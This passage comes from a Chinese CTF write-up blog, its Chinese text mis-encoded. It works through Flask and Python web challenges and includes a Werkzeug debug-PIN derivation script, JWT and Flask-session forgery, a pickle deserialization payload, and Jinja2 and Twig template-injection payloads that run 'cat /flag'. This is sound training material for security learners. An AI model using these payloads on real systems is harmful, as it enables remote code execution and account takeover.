<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username # ç”¨æˆ·å</span><br><span class="line"></span><br><span class="line">modname # flask.app</span><br><span class="line"></span><br><span class="line">getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flask</span><br><span class="line"></span><br><span class="line">getattr(mod, &#39;__file__&#39;, None) # flaskç›®å½•ä¸‹çš„ä¸€ä¸ªapp.pyçš„ç»å¯¹è·¯å¾„</span><br><span class="line"></span><br><span class="line">uuid.getnode() # macåœ°å€åè¿›åˆ¶</span><br><span class="line"></span><br><span class="line">get_machine_id() # &#x2F;etc&#x2F;machine-id</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªç”¨æˆ·åå¯ä»¥é€šè¿‡<code>/etc/passwd</code>å¾—åˆ°ï¼Œå³<code>flaskweb</code></p>
<p>ç¬¬äºŒä¸ªmodnameä¸€èˆ¬éƒ½æ˜¯é»˜è®¤çš„flask.app</p>
<p>ç¬¬ä¸‰ä¸ªä¹Ÿæ˜¯é»˜è®¤çš„Flask</p>
<p>ç¬¬å››ä¸ªæ˜¯<code>app.py</code>çš„ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŠ¥é”™æ¥è·å–</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161050.png" alt=""></p>
<p>ç¬¬å››ä¸ªmacåœ°å€å¦‚æœåœ¨çœŸå®ç¯å¢ƒæ˜¯ä»<code>/etc/machine-id</code>æ–‡ä»¶è¯»å–ï¼Œå¦‚æœæ˜¯åœ¨dockerä¸‹ï¼Œæ˜¯ä»<code>/sys/class/net/eth0/address</code>ç›®å½•ä¸‹è¯»å–ï¼Œè½¬æ¢æˆåè¿›åˆ¶<code>2485410468126</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161305.png" alt=""></p>
<blockquote>
<p>è½¬æ¢åœ°å€ï¼š<a href="https://www.vultr.com/resources/mac-converter/">https://www.vultr.com/resources/mac-converter/</a></p>
</blockquote>
<p>ç¬¬äº”ä¸ªé€šè¿‡è¯»å–<code>/proc/self/cgroup</code>è·å–machine-idï¼š1408f836b0ca514d796cbf8960e45fa1</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163205.png" alt=""></p>
<p>ç„¶åå†ä¸Šè„šæœ¬è·‘å‡ºPINç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è„šæœ¬å‡ºå¤„ï¼šhttps://xz.aliyun.com/t/2553</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377957891&#x27;</span>,<span class="comment"># address</span></span><br><span class="line">    <span class="string">&#x27;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#x27;</span><span class="comment"># machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706162426.png" alt=""></p>
<p>systemå¥½åƒè¢«ç¦ç”¨äº†ï¼Œæ¢æˆpopenå‡½æ•°</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163643.png" alt=""></p>
<h2 id="RootersCTF2019-I-â¤ï¸-Flask">RootersCTF2019 I_â¤ï¸_Flask</h2>
<h2 id="CSCCTF-2019-Qual-FlaskLight">CSCCTF 2019 Qual FlaskLight</h2>
<h2 id="pasecactf-2019-flask-ssti">pasecactf_2019 flask_ssti</h2>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Web2-ikun">CISCN2019 ååŒ—èµ›åŒº Web2 ikun</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>é€»è¾‘æ¼æ´</li>
<li>JWTä¼ªé€ </li>
<li>pickleååºåˆ—åŒ–</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<p>pythonè„šæœ¬å¯»æ‰¾LV6å•†å“æ‰€åœ¨é¡µé¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4186a81c-5092-4d1c-b2c3-6d753ef436c7.node3.buuoj.cn/shop?page=&#123;&#125;&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;_xsrf&quot;</span>: <span class="string">&quot;2|9abd3196|175f180123b348c52281c861b9ea6ba9|1593758159&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JWT&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhMDFoIn0.xjww69DlZAtZw_26KzwvCZc&quot;</span></span><br><span class="line">           <span class="string">&quot;-WhNxACW3PuvxHlQQ2yg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;commodity_id&quot;</span>: <span class="string">&quot;2|1:0|10:1593758858|12:commodity_id|4:Nw&quot;</span></span><br><span class="line">                    <span class="string">&quot;==|42eb3fadf203ceac3f14f89b8e7a575d5350b31a29c08f6a939d099435027244 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">501</span>):</span><br><span class="line">    rq = requests.get(url=url.format(i), cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="keyword">in</span> rq.text:</span><br><span class="line">        print(url.format(i))</span><br></pre></td></tr></table></figure>
<p>è·‘å‡ºæ¥çš„ç»“æœæ˜¯<code>page=181</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703150520.png" alt=""></p>
<p>ä½†æ˜¯çœ‹åˆ°è¿™ä¸ªä»·æ ¼å¾ˆæ˜¾ç„¶æ˜¯è¦é€šè¿‡æŸç§æ¼æ´æ¥è´­ä¹°ï¼Œå…ˆæŠ“åŒ…ï¼Œçœ‹åˆ°å‚æ•°åæƒ³åˆ°ä¸¤ç§åŠæ³•ï¼Œä¸€æ˜¯ç›´æ¥æ”¹ä»·æ ¼ï¼ŒäºŒæ˜¯æ”¹æŠ˜æ‰£ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152451.png" alt=""></p>
<p>å°è¯•ä¹‹åå‘ç°æ”¹ä»·æ ¼æ²¡æœ‰ç”¨ï¼Œæ”¹æŠ˜æ‰£æç¤ºä¸æ˜¯admin</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152637.png" style="zoom:50%;" />
<p>è¿™ä¸ªåœ°æ–¹å°±å¾ˆè‡ªç„¶æƒ³åˆ°è¦è¶Šæƒï¼Œä¿®æ”¹å¯†ç å¤„æ²¡æœ‰é€»è¾‘æ¼æ´ï¼Œä½†æ˜¯Cookieä¸­åŒ…å«JWTï¼Œæ”¾åˆ°jwt.ioç½‘å€ä¸Šè§£æåï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152814.png" alt=""></p>
<p>å¦‚æœæƒ³è¦ä¼ªé€ ä¸€ä¸ªadminçš„JWTéœ€è¦çŸ¥é“secretã€‚æ„Ÿè§‰è¿™ä¸ªåœ°æ–¹å°±æœ‰ç‚¹è„‘æ´äº†ï¼Œè¦ç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker">å·¥å…·</a>å»çˆ†ç ´ï¼Œæˆ‘è¿˜æ‰¾äº†å¾ˆä¹…çš„æ³¨å…¥ç‚¹ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152940.png" alt=""></p>
<p>å†å»ä¼ªé€ adminçš„JWT</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153100.png" alt=""></p>
<p>æ›´æ”¹cookieçš„å€¼</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153207.png" alt=""></p>
<p>æŸ¥çœ‹ä¸ªäººä¸­å¿ƒï¼Œå‡ºç°äº†ä¸€ä¸ªhint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703154225.png" alt=""></p>
<p>æŸ¥çœ‹æºç å‘ç°æºç åŒ…ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153940.png" alt=""></p>
<p>é¢˜ç›®æç¤ºäº†pickleï¼Œç›´æ¥å…¨å±€æœç´¢ï¼Œ<code>Admin.py</code>æœ‰pickleååºåˆ—åŒ–æ¼æ´</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160455.png" alt=""></p>
<p>åˆ©ç”¨è„šæœ¬ç”Ÿæˆpayloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>
<p>å°†ç”Ÿæˆçš„payloadæ”¾åˆ°éšè—çš„è¾“å…¥æ¡†é‡Œï¼Œåªéœ€å°†<code>hidden=&quot;hidden&quot;</code>åˆ é™¤å³å¯ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160604.png" alt=""></p>
<h2 id="SUCTF-2019-Pythonginx">SUCTF 2019 Pythonginx</h2>
<h2 id="WesternCTF2018-shring">WesternCTF2018 shring</h2>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h3 id="TODO">TODO</h3>
<h2 id="æŠ¤ç½‘æ¯2018-easy-tornado">æŠ¤ç½‘æ¯2018 easy_tornado</h2>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>tornado æ¨¡æ¿æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<p>è¿™é“é¢˜å¾ˆé‡è¦çš„ä¸€ä¸ªåœ°æ–¹å°±æ˜¯è§‚å¯Ÿurl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;eca90b16e91faf8d52c04e7ef7e7a8fc</span><br></pre></td></tr></table></figure>
<p>å¹¶ä¸”filehash=md5(cookie_secret+md5(filename))ï¼Œæ‰€ä»¥è¦æ‰¾åˆ°cookie_secretçš„å€¼ã€‚</p>
<p>å½“ä¸è¾“å…¥filehashå‚æ•°çš„æ—¶å€™ï¼Œurlæ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure>
<p>å¹¶ä¸”é¡µé¢å›æ˜¾Errorï¼Œè¿™ä¸ªå°±éœ€è¦æ¯”è¾ƒæ•æ„Ÿçš„æ³¨æ„åˆ°è¿™é‡Œæ˜¯æ¨¡æ¿æ³¨å…¥çš„ç‚¹ã€‚</p>
<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#3-Tornado">å‚è€ƒæ–‡ç« </a>ç”¨çš„å°±æ˜¯handler.settingså¯¹è±¡</p>
<blockquote>
<p>handler æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ã€‚</p>
</blockquote>
<p>æ‰€ä»¥ä¼ é€’<code>error?msg=&#123;&#123; handler.settings &#125;&#125;</code>å¾—åˆ°cookie_secretã€‚</p>
<h2 id="HCTF-2018-Hideandseek">HCTF 2018 Hideandseek</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="CISCN2019-æ€»å†³èµ›-Day1-Web3-Flask-Message-Board">[CISCN2019 æ€»å†³èµ› Day1 Web3]Flask Message Board</h2>
<h3 id="TODO-v3">TODO</h3>
<h2 id="HCTF2018-Admin">HCTF2018 Admin</h2>
<p>å‡ºé¢˜äººwriteupï¼š<a href="https://www.ckj123.com/?p=147">https://www.ckj123.com/?p=147</a></p>
<h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3>
<ul>
<li>Flask Sessionä¼ªé€ </li>
<li>Unicodeæ¬ºéª—</li>
<li>æ¡ä»¶ç«äº‰</li>
</ul>
<h3 id="è§£é¢˜-v5">è§£é¢˜</h3>
<h4 id="æ–¹æ³•ä¸€-Unicodeç¼–ç æ¬ºéª—">æ–¹æ³•ä¸€ Unicodeç¼–ç æ¬ºéª—</h4>
<p>ç»“åˆæ”¹å¯†ç çš„åŠŸèƒ½ï¼Œçœ‹ä¸€ä¸‹<code>change</code>å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ç¬¬6è¡Œçš„<code>strlower</code>æ˜¯è‡ªå·±å°è£…çš„ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨Pythonçš„åº“å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ <code>nodeprep</code> æ¥è‡ª <code>twisted.words.protocols.jabber.xmpp_stringprep</code>ã€‚</p>
<p>å¹¶ä¸”åœ¨æ³¨å†Œå’Œç™»å½•çš„ä»£ç ä¸­éƒ½ä½¿ç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨<code>ADMIN</code>ç»•è¿‡ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸€ç¯‡æ–‡ç« è®²åˆ°äº†nodeprepå…³äºUnicodeç¼–ç çš„é—®é¢˜ï¼š</p>
<blockquote>
<p><a href="https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e">https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e</a></p>
</blockquote>
<p>ä½¿ç”¨ä¸¤æ¬¡<code>nodeprep.prepare</code>å‡½æ•°ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">á´¬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Unicode â€”&gt; ä¸­æ–‡ï¼š<a href="https://tool.chinaz.com/tools/unicode.aspx">https://tool.chinaz.com/tools/unicode.aspx</a></p>
</blockquote>
<p>å³ç¬¬ä¸€æ¬¡å°†å…¶è½¬æ¢ä¸ºå¤§å†™ï¼Œç¬¬äºŒæ¬¡å°†å…¶è½¬æ¢ä¸ºå°å†™ã€‚</p>
<p>æ€è·¯ï¼š</p>
<ul>
<li>æ³¨å†Œç”¨æˆ·á´¬dmin</li>
<li>ç™»å½•ç”¨æˆ·á´¬dminï¼Œå˜æˆAdmin</li>
<li>ä¿®æ”¹å¯†ç Adminï¼Œæ›´æ”¹äº†adminçš„å¯†ç </li>
</ul>
<h4 id="æ–¹æ³•äºŒ-Flask-session-ä¼ªé€ ">æ–¹æ³•äºŒ Flask session ä¼ªé€ </h4>
<blockquote>
<p>åŸç†ï¼š<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
<p>å·¥å…·ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223051.png" alt=""></p>
<p>ä¿®æ”¹<code>name</code>ä¸º<code>admin</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;6604bc7a9890f6bf08233451da34826f785818ecb989720b4c7e7aa4f22105e0b28a5122c9e9b490f8c9609baa8efab128409afc0a7ce5ba93ccd50994d78d37&#39;, &#39;csrf_token&#39;: b&#39;135d7b0b615153fd276627d995e71a0026f75bb3&#39;, &#39;image&#39;: b&#39;mwPn&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure>
<p>å†å¯¹å…¶è¿›è¡Œencodeæ“ä½œï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223440.png" alt=""></p>
<p>æ›´æ”¹cookieçš„å€¼ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223656.png" style="zoom:67%;" />
<p>æäº¤æ›´æ”¹ï¼Œåˆ·æ–°é¡µé¢ï¼ŒæˆåŠŸè·å–flag~</p>
<h4 id="æ–¹æ³•ä¸‰-æ¡ä»¶ç«äº‰">æ–¹æ³•ä¸‰ æ¡ä»¶ç«äº‰</h4>
<blockquote>
<p><a href="https://tmr.js.org/p/3a03e44b/">https://tmr.js.org/p/3a03e44b/</a></p>
<p>ä¸ç”±çš„æ„Ÿå¹è¿™äº›äººçš„è„‘å­æ€ä¹ˆè¿™ä¹ˆå¥½ä½¿ã€‚ã€‚ã€‚ğŸ˜‚</p>
</blockquote>
<h2 id="BJDCTF-2nd-fake-google">BJDCTF 2nd fake google</h2>
<h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3>
<ul>
<li>Flask SSTI æ–‡ä»¶è¯»å–</li>
</ul>
<h3 id="è§£é¢˜-v6">è§£é¢˜</h3>
<p>è¿™é“é¢˜å°±æ˜¯æ¯”è¾ƒæ˜æ˜¾çš„Flask æ¨¡æ¿æ³¨å…¥æ¼æ´äº†ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆç»•è¿‡ï¼Œç›´æ¥ä¸Špayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__&#x3D;&#x3D;%27catch_warnings%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27].eval(&quot;__import__(%27os%27).popen(%27cat%20&#x2F;flag%27).read()&quot;)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF2020-Cookie-is-stable">BJDCTF2020 Cookie is stable</h2>
<h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3>
<ul>
<li>Python Twigæ¨¡æ¿æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v7">è§£é¢˜</h3>
<p>å’Œä¸Šé¢˜ä¸€æ ·æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œä¸è¿‡æ³¨å…¥ç‚¹åœ¨Cookieé‡Œ</p>
<p>æ¸²æŸ“å¼•æ“ä¹Ÿæ¢æˆäº†åŸºäºPythonçš„Twig</p>
<p>ä»ç½‘ä¸Šæ‰¾åˆ°çš„ Twig poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id=""></h3>
<h2 id="V-Nå…¬å¼€èµ›-CheckIn">V&amp;Nå…¬å¼€èµ› CheckIn</h2>
<h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3>
<ul>
<li>åå¼¹shell</li>
<li>æ–‡ä»¶æè¿°ç¬¦</li>
</ul>
<h3 id="è§£é¢˜-v8">è§£é¢˜</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>shellè·¯ç”±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œå‘½ä»¤ä¹‹å‰flag.txtå·²ç»è¢«åˆ é™¤äº†ï¼Œå¹¶ä¸”ä¸èƒ½å›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚</p>
